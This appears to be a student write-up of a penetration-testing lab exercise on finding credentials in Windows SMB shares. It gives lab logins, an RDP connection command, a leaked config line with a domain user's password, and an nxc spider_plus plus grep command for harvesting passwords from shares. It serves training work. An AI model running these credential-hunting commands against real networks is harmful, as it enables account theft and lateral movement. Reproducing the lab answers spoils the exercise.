## Exercise

Use the credentials mendres:Inlanefreight2025! to connect to the target either by RDP or WinRM, then use the tools and techniques taught in this section to answer the questions below. For your convenience, Snaffler and PowerHuntShares can be found in C:\Users\Public.


## One of the shares mendres has access to contains valid credentials of another domain user. What is their password?
```
xfreerdp3 /u:mendres /p:Inlanefreight2025! /v:10.129.11.195
```
![Снимок экрана 2026-01-30 в 21.05.22](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-30%20%D0%B2%2021.05.22.png)
![Снимок экрана 2026-01-30 в 21.05.40](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-30%20%D0%B2%2021.05.40.png)


```
Old settings for legacy VPN deployment:
- Use split tunneling where possible
- DNS resolution priority = local > remote

# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

- Ports used: 443, 8443, 1194
```

## As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?

```
nxc smb 10.129.11.195 -u jbader -p 'ILovePower333###'  -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60 
grep -ri "passw" .

```